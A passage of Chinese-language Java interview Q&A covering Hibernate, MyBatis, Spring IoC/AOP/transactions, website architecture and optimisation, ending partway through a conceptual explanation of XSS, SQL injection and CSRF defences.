在session关闭之前先获取需要查询的数据，可以使用工具方法Hibernate.isInitialized()判断对象是否被加载，如果没有被加载则可以使用Hibernate.initialize()方法加载对象。③ 使用拦截器或过滤器延长Session的生命周期直到视图获得数据。Spring整合Hibernate提供的OpenSessionInViewFilter和OpenSessionInViewInterceptor就是这种做法。 举一个多对多关联的例子，并说明如何实现多对多关联映射。答：例如：商品和订单、学生和课程都是典型的多对多关系。可以在实体类上通过@ManyToMany注解配置多对多关联或者通过映射文件中的和标签配置多对多关联，但是实际项目开发中，很多时候都是将多对多关联映射转换成两个多对一关联映射来实现的。 谈一下你对继承映射的理解。答：继承关系的映射策略有三种：① 每个继承结构一张表（table per class hierarchy），不管多少个子类都用一张表。② 每个子类一张表（table per subclass），公共信息放一张表，特有信息放单独的表。③ 每个具体类一张表（table per concrete class），有多少个子类就有多少张表。第一种方式属于单表策略，其优点在于查询子类对象的时候无需表连接，查询速度快，适合多态查询；缺点是可能导致表很大。后两种方式属于多表策略，其优点在于数据存储紧凑，其缺点是需要进行连接查询，不适合多态查询。 简述Hibernate常见优化策略。答：这个问题应当挑自己使用过的优化策略回答，常用的有：① 制定合理的缓存策略（二级缓存、查询缓存）。② 采用合理的Session管理机制。③ 尽量使用延迟加载特性。④ 设定合理的批处理参数。⑤ 如果可以，选用UUID作为主键生成器。⑥ 如果可以，选用基于版本号的乐观锁替代悲观锁。⑦ 在开发过程中, 开启hibernate.show_sql选项查看生成的SQL，从而了解底层的状况；开发完成后关闭此选项。⑧ 考虑数据库本身的优化，合理的索引、恰当的数据分区策略等都会对持久层的性能带来可观的提升，但这些需要专业的DBA（数据库管理员）提供支持。 谈一谈Hibernate的一级缓存、二级缓存和查询缓存。答：Hibernate的Session提供了一级缓存的功能，默认总是有效的，当应用程序保存持久化实体、修改持久化实体时，Session并不会立即把这种改变提交到数据库，而是缓存在当前的Session中，除非显示调用了Session的flush()方法或通过close()方法关闭Session。通过一级缓存，可以减少程序与数据库的交互，从而提高数据库访问性能。SessionFactory级别的二级缓存是全局性的，所有的Session可以共享这个二级缓存。不过二级缓存默认是关闭的，需要显示开启并指定需要使用哪种二级缓存实现类（可以使用第三方提供的实现）。一旦开启了二级缓存并设置了需要使用二级缓存的实体类，SessionFactory就会缓存访问过的该实体类的每个对象，除非缓存的数据超出了指定的缓存空间。一级缓存和二级缓存都是对整个实体进行缓存，不会缓存普通属性，如果希望对普通属性进行缓存，可以使用查询缓存。查询缓存是将HQL或SQL语句以及它们的查询结果作为键值对进行缓存，对于同样的查询可以直接从缓存中获取数据。查询缓存默认也是关闭的，需要显示开启。 Hibernate中DetachedCriteria类是做什么的？答：DetachedCriteria和Criteria的用法基本上是一致的，但Criteria是由Session的createCriteria()方法创建的，也就意味着离开创建它的Session，Criteria就无法使用了。DetachedCriteria不需要Session就可以创建（使用DetachedCriteria.forClass()方法创建），所以通常也称其为离线的Criteria，在需要进行查询操作的时候再和Session绑定（调用其getExecutableCriteria(Session)方法），这也就意味着一个DetachedCriteria可以在需要的时候和不同的Session进行绑定。 ##@OneToMany注解的mappedBy属性有什么作用？ 答：@OneToMany用来配置一对多关联映射，但通常情况下，一对多关联映射都由多的一方来维护关联关系，例如学生和班级，应该在学生类中添加班级属性来维持学生和班级的关联关系（在数据库中是由学生表中的外键班级编号来维护学生表和班级表的多对一关系），如果要使用双向关联，在班级类中添加一个容器属性来存放学生，并使用@OneToMany注解进行映射，此时mappedBy属性就非常重要。如果使用XML进行配置，可以用标签的inverse=”true”设置来达到同样的效果。 MyBatis中使用#和$书写占位符有什么区别？答：#将传入的数据都当成一个字符串，会对传入的数据自动加上引号；$将传入的数据直接显示生成在SQL中。注意：使用$占位符可能会导致SQL注射攻击，能用#的地方就不要使用$，写order by子句的时候应该用$而不是#。 解释一下MyBatis中命名空间（namespace）的作用。答：在大型项目中，可能存在大量的SQL语句，这时候为每个SQL语句起一个唯一的标识（ID）就变得并不容易了。为了解决这个问题，在MyBatis中，可以为每个映射文件起一个唯一的命名空间，这样定义在这个映射文件中的每个SQL语句就成了定义在这个命名空间中的一个ID。只要我们能够保证每个命名空间中这个ID是唯一的，即使在不同映射文件中的语句ID相同，也不会再产生冲突了。 MyBatis中的动态SQL是什么意思？答：对于一些复杂的查询，我们可能会指定多个查询条件，但是这些条件可能存在也可能不存在，例如在58同城上面找房子，我们可能会指定面积、楼层和所在位置来查找房源，也可能会指定面积、价格、户型和所在位置来查找房源，此时就需要根据用户指定的条件动态生成SQL语句。如果不使用持久层框架我们可能需要自己拼装SQL语句，还好MyBatis提供了动态SQL的功能来解决这个问题。MyBatis中用于实现动态SQL的元素主要有： if choose / when / otherwise trim where set foreach 下面是映射文件的片段。 当然也可以像下面这些书写。 再看看下面这个例子。 什么是IoC和DI？DI是如何实现的？答：IoC叫控制反转，是Inversion of Control的缩写，DI（Dependency Injection）叫依赖注入，是对IoC更简单的诠释。控制反转是把传统上由程序代码直接操控的对象的调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的”控制反转”就是对组件对象控制权的转移，从程序代码本身转移到了外部容器，由容器来创建对象并管理对象之间的依赖关系。IoC体现了好莱坞原则 – “Don’t call me, we will call you”。依赖注入的基本原则是应用组件不应该负责查找资源或者其他依赖的协作对象。配置对象的工作应该由容器负责，查找资源的逻辑应该从应用组件的代码中抽取出来，交给容器来完成。DI是对IoC更准确的描述，即组件之间的依赖关系由容器在运行期决定，形象的来说，即由容器动态的将某种依赖关系注入到组件之中。 举个例子：一个类A需要用到接口B中的方法，那么就需要为类A和接口B建立关联或依赖关系，最原始的方法是在类A中创建一个接口B的实现类C的实例，但这种方法需要开发人员自行维护二者的依赖关系，也就是说当依赖关系发生变动的时候需要修改代码并重新构建整个系统。如果通过一个容器来管理这些对象以及对象的依赖关系，则只需要在类A中定义好用于关联接口B的方法（构造器或setter方法），将类A和接口B的实现类C放入容器中，通过对容器的配置来实现二者的关联。 依赖注入可以通过setter方法注入（设值注入）、构造器注入和接口注入三种方式来实现，Spring支持setter注入和构造器注入，通常使用构造器注入来注入必须的依赖关系，对于可选的依赖关系，则setter注入是更好的选择，setter注入需要类提供无参构造器或者无参的静态工厂方法来创建对象。 Spring中Bean的作用域有哪些？答：在Spring的早期版本中，仅有两个作用域：singleton和prototype，前者表示Bean以单例的方式存在；后者表示每次从容器中调用Bean时，都会返回一个新的实例，prototype通常翻译为原型。 补充：设计模式中的创建型模式中也有一个原型模式，原型模式也是一个常用的模式，例如做一个室内设计软件，所有的素材都在工具箱中，而每次从工具箱中取出的都是素材对象的一个原型，可以通过对象克隆来实现原型模式。 Spring 2.x中针对WebApplicationContext新增了3个作用域，分别是：request（每次HTTP请求都会创建一个新的Bean）、session（同一个HttpSession共享同一个Bean，不同的HttpSession使用不同的Bean）和globalSession（同一个全局Session共享一个Bean）。 说明：单例模式和原型模式都是重要的设计模式。一般情况下，无状态或状态不可变的类适合使用单例模式。在传统开发中，由于DAO持有Connection这个非线程安全对象因而没有使用单例模式；但在Spring环境下，所有DAO类对可以采用单例模式，因为Spring利用AOP和Java API中的ThreadLocal对非线程安全的对象进行了特殊处理。 ThreadLocal为解决多线程程序的并发问题提供了一种新的思路。ThreadLocal，顾名思义是线程的一个本地化对象，当工作于多线程中的对象使用ThreadLocal维护变量时，ThreadLocal为每个使用该变量的线程分配一个独立的变量副本，所以每一个线程都可以独立的改变自己的副本，而不影响其他线程所对应的副本。从线程的角度看，这个变量就像是线程的本地变量。 ThreadLocal类非常简单好用，只有四个方法，能用上的也就是下面三个方法： void set(T value)：设置当前线程的线程局部变量的值。 T get()：获得当前线程所对应的线程局部变量的值。 void remove()：删除当前线程中线程局部变量的值。 ThreadLocal是如何做到为每一个线程维护一份独立的变量副本的呢？在ThreadLocal类中有一个Map，键为线程对象，值是其线程对应的变量的副本，自己要模拟实现一个ThreadLocal类其实并不困难，代码如下所示： 解释一下什么叫AOP（面向切面编程）？答：AOP（Aspect-Oriented Programming）指一种程序设计范型，该范型以一种称为切面（aspect）的语言构造为基础，切面是一种新的模块化机制，用来描述分散在对象、类或方法中的横切关注点（crosscutting concern）。 你是如何理解”横切关注”这个概念的？答：”横切关注”是会影响到整个应用程序的关注功能，它跟正常的业务逻辑是正交的，没有必然的联系，但是几乎所有的业务逻辑都会涉及到这些关注功能。通常，事务、日志、安全性等关注就是应用中的横切关注功能。 你如何理解AOP中的连接点（Joinpoint）、切点（Pointcut）、增强（Advice）、引介（Introduction）、织入（Weaving）、切面（Aspect）这些概念？答：a. 连接点（Joinpoint）：程序执行的某个特定位置（如：某个方法调用前、调用后，方法抛出异常后）。一个类或一段程序代码拥有一些具有边界性质的特定点，这些代码中的特定点就是连接点。Spring仅支持方法的连接点。b. 切点（Pointcut）：如果连接点相当于数据中的记录，那么切点相当于查询条件，一个切点可以匹配多个连接点。Spring AOP的规则解析引擎负责解析切点所设定的查询条件，找到对应的连接点。c. 增强（Advice）：增强是织入到目标类连接点上的一段程序代码。Spring提供的增强接口都是带方位名的，如：BeforeAdvice、AfterReturningAdvice、ThrowsAdvice等。很多资料上将增强译为“通知”，这明显是个词不达意的翻译，让很多程序员困惑了许久。 说明： Advice在国内的很多书面资料中都被翻译成”通知”，但是很显然这个翻译无法表达其本质，有少量的读物上将这个词翻译为”增强”，这个翻译是对Advice较为准确的诠释，我们通过AOP将横切关注功能加到原有的业务逻辑上，这就是对原有业务逻辑的一种增强，这种增强可以是前置增强、后置增强、返回后增强、抛异常时增强和包围型增强。 d. 引介（Introduction）：引介是一种特殊的增强，它为类添加一些属性和方法。这样，即使一个业务类原本没有实现某个接口，通过引介功能，可以动态的未该业务类添加接口的实现逻辑，让业务类成为这个接口的实现类。e. 织入（Weaving）：织入是将增强添加到目标类具体连接点上的过程，AOP有三种织入方式：①编译期织入：需要特殊的Java编译期（例如AspectJ的ajc）；②装载期织入：要求使用特殊的类加载器，在装载类的时候对类进行增强；③运行时织入：在运行时为目标类生成代理实现增强。Spring采用了动态代理的方式实现了运行时织入，而AspectJ采用了编译期织入和装载期织入的方式。f. 切面（Aspect）：切面是由切点和增强（引介）组成的，它包括了对横切关注功能的定义，也包括了对连接点的定义。 补充：代理模式是GoF提出的23种设计模式中最为经典的模式之一，代理模式是对象的结构模式，它给某一个对象提供一个代理对象，并由代理对象控制对原对象的引用。简单的说，代理对象可以完成比原对象更多的职责，当需要为原对象添加横切关注功能时，就可以使用原对象的代理对象。我们在打开Office系列的Word文档时，如果文档中有插图，当文档刚加载时，文档中的插图都只是一个虚框占位符，等用户真正翻到某页要查看该图片时，才会真正加载这张图，这其实就是对代理模式的使用，代替真正图片的虚框就是一个虚拟代理；Hibernate的load方法也是返回一个虚拟代理对象，等用户真正需要访问对象的属性时，才向数据库发出SQL语句获得真实对象。 下面用一个找枪手代考的例子演示代理模式的使用： 说明：从JDK 1.3开始，Java提供了动态代理技术，允许开发者在运行时创建接口的代理实例，主要包括Proxy类和InvocationHandler接口。下面的例子使用动态代理为ArrayList编写一个代理，在添加和删除元素时，在控制台打印添加或删除的元素以及ArrayList的大小： 说明：使用Java的动态代理有一个局限性就是代理的类必须要实现接口，虽然面向接口编程是每个优秀的Java程序都知道的规则，但现实往往不尽如人意，对于没有实现接口的类如何为其生成代理呢？继承！继承是最经典的扩展已有代码能力的手段，虽然继承常常被初学者滥用，但继承也常常被进阶的程序员忽视。CGLib采用非常底层的字节码生成技术，通过为一个类创建子类来生成代理，它弥补了Java动态代理的不足，因此Spring中动态代理和CGLib都是创建代理的重要手段，对于实现了接口的类就用动态代理为其生成代理类，而没有实现接口的类就用CGLib通过继承的方式为其创建代理。 Spring中自动装配的方式有哪些？答： no：不进行自动装配，手动设置Bean的依赖关系。 byName：根据Bean的名字进行自动装配。 byType：根据Bean的类型进行自动装配。 constructor：类似于byType，不过是应用于构造器的参数，如果正好有一个Bean与构造器的参数类型相同则可以自动装配，否则会导致错误。 autodetect：如果有默认的构造器，则通过constructor的方式进行自动装配，否则使用byType的方式进行自动装配。 说明：自动装配没有自定义装配方式那么精确，而且不能自动装配简单属性（基本类型、字符串等），在使用时应注意。 Spring中如何使用注解来配置Bean？有哪些相关的注解？答：首先需要在Spring配置文件中增加如下配置： 然后可以用@Component、@Controller、@Service、@Repository注解来标注需要由Spring IoC容器进行对象托管的类。这几个注解没有本质区别，只不过@Controller通常用于控制器，@Service通常用于业务逻辑类，@Repository通常用于仓储类（例如我们的DAO实现类），普通的类用@Component来标注。 Spring支持的事务管理类型有哪些？你在项目中使用哪种方式？答：Spring支持编程式事务管理和声明式事务管理。许多Spring框架的用户选择声明式事务管理，因为这种方式和应用程序的关联较少，因此更加符合轻量级容器的概念。声明式事务管理要优于编程式事务管理，尽管在灵活性方面它弱于编程式事务管理，因为编程式事务允许你通过代码控制业务。 事务分为全局事务和局部事务。全局事务由应用服务器管理，需要底层服务器JTA支持（如WebLogic、WildFly等）。局部事务和底层采用的持久化方案有关，例如使用JDBC进行持久化时，需要使用Connetion对象来操作事务；而采用Hibernate进行持久化时，需要使用Session对象来操作事务。 Spring提供了如下所示的事务管理器。 事务管理器实现类 目标对象 DataSourceTransactionManager 注入DataSource HibernateTransactionManager 注入SessionFactory JdoTransactionManager 管理JDO事务 JtaTransactionManager 使用JTA管理事务 PersistenceBrokerTransactionManager 管理Apache的OJB事务 这些事务的父接口都是PlatformTransactionManager。Spring的事务管理机制是一种典型的策略模式，PlatformTransactionManager代表事务管理接口，该接口定义了三个方法，该接口并不知道底层如何管理事务，但是它的实现类必须提供getTransaction()方法（开启事务）、commit()方法（提交事务）、rollback()方法（回滚事务）的多态实现，这样就可以用不同的实现类代表不同的事务管理策略。使用JTA全局事务策略时，需要底层应用服务器支持，而不同的应用服务器所提供的JTA全局事务可能存在细节上的差异，因此实际配置全局事务管理器是可能需要使用JtaTransactionManager的子类，如：WebLogicJtaTransactionManager（Oracle的WebLogic服务器提供）、UowJtaTransactionManager（IBM的WebSphere服务器提供）等。 编程式事务管理如下所示。 声明式事务如下图所示，以Spring整合Hibernate 3为例，包括完整的DAO和业务逻辑代码。 如何在Web项目中配置Spring的IoC容器？答：如果需要在Web项目中使用Spring的IoC容器，可以在Web项目配置文件web.xml中做出如下配置： 如何在Web项目中配置Spring MVC？答：要使用Spring MVC需要在Web项目配置文件中配置其前端控制器DispatcherServlet，如下所示： 说明：上面的配置中使用了*.html的后缀映射，这样做一方面不能够通过URL推断采用了何种服务器端的技术，另一方面可以欺骗搜索引擎，因为搜索引擎不会搜索动态页面，这种做法称为伪静态化。 Spring MVC的工作原理是怎样的？答：Spring MVC的工作原理如下图所示：① 客户端的所有请求都交给前端控制器DispatcherServlet来处理，它会负责调用系统的其他模块来真正处理用户的请求。② DispatcherServlet收到请求后，将根据请求的信息（包括URL、HTTP协议方法、请求头、请求参数、Cookie等）以及HandlerMapping的配置找到处理该请求的Handler（任何一个对象都可以作为请求的Handler）。③在这个地方Spring会通过HandlerAdapter对该处理器进行封装。④ HandlerAdapter是一个适配器，它用统一的接口对各种Handler中的方法进行调用。⑤ Handler完成对用户请求的处理后，会返回一个ModelAndView对象给DispatcherServlet，ModelAndView顾名思义，包含了数据模型以及相应的视图的信息。⑥ ModelAndView的视图是逻辑视图，DispatcherServlet还要借助ViewResolver完成从逻辑视图到真实视图对象的解析工作。⑦ 当得到真正的视图对象后，DispatcherServlet会利用视图对象对模型数据进行渲染。⑧ 客户端得到响应，可能是一个普通的HTML页面，也可以是XML或JSON字符串，还可以是一张图片或者一个PDF文件。 如何在Spring IoC容器中配置数据源？答：DBCP配置： 123456789&lt;bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close"&gt; &lt;property name="driverClassName" value="$&#123;jdbc.driverClassName&#125;"/&gt; &lt;property name="url" value="$&#123;jdbc.url&#125;"/&gt; &lt;property name="username" value="$&#123;jdbc.username&#125;"/&gt; &lt;property name="password" value="$&#123;jdbc.password&#125;"/&gt;&lt;/bean&gt; &lt;context:property-placeholder location="jdbc.properties"/&gt; C3P0配置： 123456789&lt;bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource" destroy-method="close"&gt; &lt;property name="driverClass" value="$&#123;jdbc.driverClassName&#125;"/&gt; &lt;property name="jdbcUrl" value="$&#123;jdbc.url&#125;"/&gt; &lt;property name="user" value="$&#123;jdbc.username&#125;"/&gt; &lt;property name="password" value="$&#123;jdbc.password&#125;"/&gt;&lt;/bean&gt; &lt;context:property-placeholder location="jdbc.properties"/&gt; 如何配置配置事务增强？答： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:aop="http://www.springframework.org/schema/aop" xmlns:tx="http://www.springframework.org/schema/tx" xsi:schemaLocation=" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd"&gt; &lt;!-- this is the service object that we want to make transactional --&gt; &lt;bean id="fooService" class="x.y.service.DefaultFooService"/&gt; &lt;!-- the transactional advice --&gt; &lt;tx:advice id="txAdvice" transaction-manager="txManager"&gt; &lt;!-- the transactional semantics... --&gt; &lt;tx:attributes&gt; &lt;!-- all methods starting with 'get' are read-only --&gt; &lt;tx:method name="get*" read-only="true"/&gt; &lt;!-- other methods use the default transaction settings (see below) --&gt; &lt;tx:method name="*"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- ensure that the above transactional advice runs for any execution of an operation defined by the FooService interface --&gt; &lt;aop:config&gt; &lt;aop:pointcut id="fooServiceOperation" expression="execution(* x.y.service.FooService.*(..))"/&gt; &lt;aop:advisor advice-ref="txAdvice" pointcut-ref="fooServiceOperation"/&gt; &lt;/aop:config&gt; &lt;!-- don't forget the DataSource --&gt; &lt;bean id="dataSource" class="org.apache.commons.dbcp.BasicDataSource" destroy-method="close"&gt; &lt;property name="driverClassName" value="oracle.jdbc.driver.OracleDriver"/&gt; &lt;property name="url" value="jdbc:oracle:thin:@localhost:1521:orcl"/&gt; &lt;property name="username" value="scott"/&gt; &lt;property name="password" value="tiger"/&gt; &lt;/bean&gt; &lt;!-- similarly, don't forget the PlatformTransactionManager --&gt; &lt;bean id="txManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager"&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;/bean&gt; &lt;!-- other &lt;bean/&gt; definitions here --&gt; &lt;/beans&gt; 选择使用Spring框架的原因（Spring框架为企业级开发带来的好处有哪些）？答：可以从以下几个方面作答： 非侵入式：支持基于POJO的编程模式，不强制性的要求实现Spring框架中的接口或继承Spring框架中的类。 IoC容器：IoC容器帮助应用程序管理对象以及对象之间的依赖关系，对象之间的依赖关系如果发生了改变只需要修改配置文件而不是修改代码，因为代码的修改可能意味着项目的重新构建和完整的回归测试。有了IoC容器，程序员再也不需要自己编写工厂、单例，这一点特别符合Spring的精神”不要重复的发明轮子”。 AOP（面向切面编程）：将所有的横切关注功能封装到切面（aspect）中，通过配置的方式将横切关注功能动态添加到目标代码上，进一步实现了业务逻辑和系统服务之间的分离。另一方面，有了AOP程序员可以省去很多自己写代理类的工作。 MVC：Spring的MVC框架是非常优秀的，从各个方面都可以甩Struts 2几条街，为Web表示层提供了更好的解决方案。 事务管理：Spring以宽广的胸怀接纳多种持久层技术，并且为其提供了声明式的事务管理，在不需要任何一行代码的情况下就能够完成事务管理。 其他：选择Spring框架的原因还远不止于此，Spring为Java企业级开发提供了一站式选择，你可以在需要的时候使用它的部分和全部，更重要的是，你甚至可以在感觉不到Spring存在的情况下，在你的项目中使用Spring提供的各种优秀的功能。 Spring IoC容器配置Bean的方式？答： 基于XML文件进行配置。 基于注解进行配置。 基于Java程序进行配置（Spring 3+） 123456789101112131415161718192021222324252627package com.jackfrued.bean; import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Component; @Componentpublic class Person &#123; private String name; private int age; @Autowired private Car car; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; public void setCar(Car car) &#123; this.car = car; &#125; @Override public String toString() &#123; return "Person [name=" + name + ", age=" + age + ", car=" + car + "]"; &#125; &#125; 1234567891011121314151617181920package com.jackfrued.bean; import org.springframework.stereotype.Component; @Componentpublic class Car &#123; private String brand; private int maxSpeed; public Car(String brand, int maxSpeed) &#123; this.brand = brand; this.maxSpeed = maxSpeed; &#125; @Override public String toString() &#123; return "Car [brand=" + brand + ", maxSpeed=" + maxSpeed + "]"; &#125; &#125; 123456789101112131415161718192021package com.jackfrued.config; import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration; import com.jackfrued.bean.Car;import com.jackfrued.bean.Person; @Configurationpublic class AppConfig &#123; @Bean public Car car() &#123; return new Car("Benz", 320); &#125; @Bean public Person person() &#123; return new Person("骆昊", 34); &#125;&#125; 123456789101112131415161718package com.jackfrued.test; import org.springframework.context.ConfigurableApplicationContext;import org.springframework.context.annotation.AnnotationConfigApplicationContext; import com.jackfrued.bean.Person;import com.jackfrued.config.AppConfig; class Test &#123; public static void main(String[] args) &#123; // TWR (Java 7+) try(ConfigurableApplicationContext factory = new AnnotationConfigApplicationContext(AppConfig.class)) &#123; Person person = factory.getBean(Person.class); System.out.println(person); &#125; &#125;&#125; ####阐述Spring框架中Bean的生命周期？ 答：① Spring IoC容器找到关于Bean的定义并实例化该Bean。② Spring IoC容器对Bean进行依赖注入。③ 如果Bean实现了BeanNameAware接口，则将该Bean的id传给setBeanName方法。④ 如果Bean实现了BeanFactoryAware接口，则将BeanFactory对象传给setBeanFactory方法。⑤ 如果Bean实现了BeanPostProcessor接口，则调用其postProcessBeforeInitialization方法。⑥ 如果Bean实现了InitializingBean接口，则调用其afterPropertySet方法。⑦ 如果有和Bean关联的BeanPostProcessors对象，则这些对象的postProcessAfterInitialization方法被调用。⑧ 当销毁Bean实例时，如果Bean实现了DisposableBean接口，则调用其destroy方法。 依赖注入时如何注入集合属性？答：可以在定义Bean属性时，通过 / / / 分别为其注入列表、集合、映射和键值都是字符串的映射属性。 Spring中的自动装配有哪些限制？答：+如果使用了构造器注入或者setter注入，那么将覆盖自动装配的依赖关系。 基本数据类型的值、字符串字面量、类字面量无法使用自动装配来注入。 优先考虑使用显式的装配来进行更精确的依赖注入而不是使用自动装配。 在Web项目中如何获得Spring的IoC容器？答： 大型网站在架构上应当考虑哪些问题？答： 分层：分层是处理任何复杂系统最常见的手段之一，将系统横向切分成若干个层面，每个层面只承担单一的职责，然后通过下层为上层提供的基础设施和服务以及上层对下层的调用来形成一个完整的复杂的系统。计算机网络的开放系统互联参考模型（OSI/RM）和Internet的TCP/IP模型都是分层结构，大型网站的软件系统也可以使用分层的理念将其分为持久层（提供数据存储和访问服务）、业务层（处理业务逻辑，系统中最核心的部分）和表示层（系统交互、视图展示）。需要指出的是：（1）分层是逻辑上的划分，在物理上可以位于同一设备上也可以在不同的设备上部署不同的功能模块，这样可以使用更多的计算资源来应对用户的并发访问；（2）层与层之间应当有清晰的边界，这样分层才有意义，才更利于软件的开发和维护。 分割：分割是对软件的纵向切分。我们可以将大型网站的不同功能和服务分割开，形成高内聚低耦合的功能模块（单元）。在设计初期可以做一个粗粒度的分割，将网站分割为若干个功能模块，后期还可以进一步对每个模块进行细粒度的分割，这样一方面有助于软件的开发和维护，另一方面有助于分布式的部署，提供网站的并发处理能力和功能的扩展。 分布式：除了上面提到的内容，网站的静态资源（JavaScript、CSS、图片等）也可以采用独立分布式部署并采用独立的域名，这样可以减轻应用服务器的负载压力，也使得浏览器对资源的加载更快。数据的存取也应该是分布式的，传统的商业级关系型数据库产品基本上都支持分布式部署，而新生的NoSQL产品几乎都是分布式的。当然，网站后台的业务处理也要使用分布式技术，例如查询索引的构建、数据分析等，这些业务计算规模庞大，可以使用Hadoop以及MapReduce分布式计算框架来处理。 集群：集群使得有更多的服务器提供相同的服务，可以更好的提供对并发的支持。 缓存：所谓缓存就是用空间换取时间的技术，将数据尽可能放在距离计算最近的位置。使用缓存是网站优化的第一定律。我们通常说的CDN、反向代理、热点数据都是对缓存技术的使用。 异步：异步是实现软件实体之间解耦合的又一重要手段。异步架构是典型的生产者消费者模式，二者之间没有直接的调用关系，只要保持数据结构不变，彼此功能实现可以随意变化而不互相影响，这对网站的扩展非常有利。使用异步处理还可以提高系统可用性，加快网站的响应速度（用Ajax加载数据就是一种异步技术），同时还可以起到削峰作用（应对瞬时高并发）。&amp;quot；能推迟处理的都要推迟处理”是网站优化的第二定律，而异步是践行网站优化第二定律的重要手段。 冗余：各种服务器都要提供相应的冗余服务器以便在某台或某些服务器宕机时还能保证网站可以正常工作，同时也提供了灾难恢复的可能性。冗余是网站高可用性的重要保证。 你用过的网站前端优化的技术有哪些？答：① 浏览器访问优化： 减少HTTP请求数量：合并CSS、合并JavaScript、合并图片（CSS Sprite） 使用浏览器缓存：通过设置HTTP响应头中的Cache-Control和Expires属性，将CSS、JavaScript、图片等在浏览器中缓存，当这些静态资源需要更新时，可以更新HTML文件中的引用来让浏览器重新请求新的资源 启用压缩 CSS前置，JavaScript后置 减少Cookie传输② CDN加速：CDN（Content Distribute Network）的本质仍然是缓存，将数据缓存在离用户最近的地方，CDN通常部署在网络运营商的机房，不仅可以提升响应速度，还可以减少应用服务器的压力。当然，CDN缓存的通常都是静态资源。③ 反向代理：反向代理相当于应用服务器的一个门面，可以保护网站的安全性，也可以实现负载均衡的功能，当然最重要的是它缓存了用户访问的热点资源，可以直接从反向代理将某些内容返回给用户浏览器。 你使用过的应用服务器优化技术有哪些？答：① 分布式缓存：缓存的本质就是内存中的哈希表，如果设计一个优质的哈希函数，那么理论上哈希表读写的渐近时间复杂度为O(1)。缓存主要用来存放那些读写比很高、变化很少的数据，这样应用程序读取数据时先到缓存中读取，如果没有或者数据已经失效再去访问数据库或文件系统，并根据拟定的规则将数据写入缓存。对网站数据的访问也符合二八定律（Pareto分布，幂律分布），即80%的访问都集中在20%的数据上，如果能够将这20%的数据缓存起来，那么系统的性能将得到显著的改善。当然，使用缓存需要解决以下几个问题： 频繁修改的数据； 数据不一致与脏读； 缓存雪崩（可以采用分布式缓存服务器集群加以解决，memcached是广泛采用的解决方案）； 缓存预热； 缓存穿透（恶意持续请求不存在的数据）。② 异步操作：可以使用消息队列将调用异步化，通过异步处理将短时间高并发产生的事件消息存储在消息队列中，从而起到削峰作用。电商网站在进行促销活动时，可以将用户的订单请求存入消息队列，这样可以抵御大量的并发订单请求对系统和数据库的冲击。目前，绝大多数的电商网站即便不进行促销活动，订单系统都采用了消息队列来处理。③ 使用集群。④ 代码优化： 多线程：基于Java的Web开发基本上都通过多线程的方式响应用户的并发请求，使用多线程技术在编程上要解决线程安全问题，主要可以考虑以下几个方面：A. 将对象设计为无状态对象（这和面向对象的编程观点是矛盾的，在面向对象的世界中被视为不良设计），这样就不会存在并发访问时对象状态不一致的问题。B. 在方法内部创建对象，这样对象由进入方法的线程创建，不会出现多个线程访问同一对象的问题。使用ThreadLocal将对象与线程绑定也是很好的做法，这一点在前面已经探讨过了。C. 对资源进行并发访问时应当使用合理的锁机制。 非阻塞I/O： 使用单线程和非阻塞I/O是目前公认的比多线程的方式更能充分发挥服务器性能的应用模式，基于Node.js构建的服务器就采用了这样的方式。Java在JDK 1.4中就引入了NIO（Non-blocking I/O）,在Servlet 3规范中又引入了异步Servlet的概念，这些都为在服务器端采用非阻塞I/O提供了必要的基础。 资源复用：资源复用主要有两种方式，一是单例，二是对象池，我们使用的数据库连接池、线程池都是对象池化技术，这是典型的用空间换取时间的策略，另一方面也实现对资源的复用，从而避免了不必要的创建和释放资源所带来的开销。 什么是XSS攻击？什么是SQL注入攻击？什么是CSRF攻击？答： XSS（Cross Site Script，跨站脚本攻击）是向网页中注入恶意脚本在用户浏览网页时在用户浏览器中执行恶意脚本的攻击方式。跨站脚本攻击分有两种形式：反射型攻击（诱使用户点击一个嵌入恶意脚本的链接以达到攻击的目标，目前有很多攻击者利用论坛、微博发布含有恶意脚本的URL就属于这种方式）和持久型攻击（将恶意脚本提交到被攻击网站的数据库中，用户浏览网页时，恶意脚本从数据库中被加载到页面执行，QQ邮箱的早期版本就曾经被利用作为持久型跨站脚本攻击的平台）。XSS虽然不是什么新鲜玩意，但是攻击的手法却不断翻新，防范XSS主要有两方面：消毒（对危险字符进行转义）和HttpOnly（防范XSS攻击者窃取Cookie数据）。 SQL注入攻击是注入攻击最常见的形式（此外还有OS注入攻击（Struts 2的高危漏洞就是通过OGNL实施OS注入攻击导致的）），当服务器使用请求参数构造SQL语句时，恶意的SQL被嵌入到SQL中交给数据库执行。SQL注入攻击需要攻击者对数据库结构有所了解才能进行，攻击者想要获得表结构有多种方式：（1）如果使用开源系统搭建网站，数据库结构也是公开的（目前有很多现成的系统可以直接搭建论坛，电商网站，虽然方便快捷但是风险是必须要认真评估的）；（2）错误回显（如果将服务器的错误信息直接显示在页面上，攻击者可以通过非法参数引发页面错误从而通过错误信息了解数据库结构，Web应用应当设置友好的错误页，一方面符合最小惊讶原则，一方面屏蔽掉可能给系统带来危险的错误回显信息）；（3）盲注。防范SQL注入攻击也可以采用消毒的方式，通过正则表达式对请求参数进行验证，此外，参数绑定也是很好的手段，这样恶意的SQL会被当做SQL的参数而不是命令被执行，JDBC中的PreparedStatement就是支持参数绑定的语句对象，从性能和安全性上都明显优于Statement。 CSRF攻击（Cross Site Request 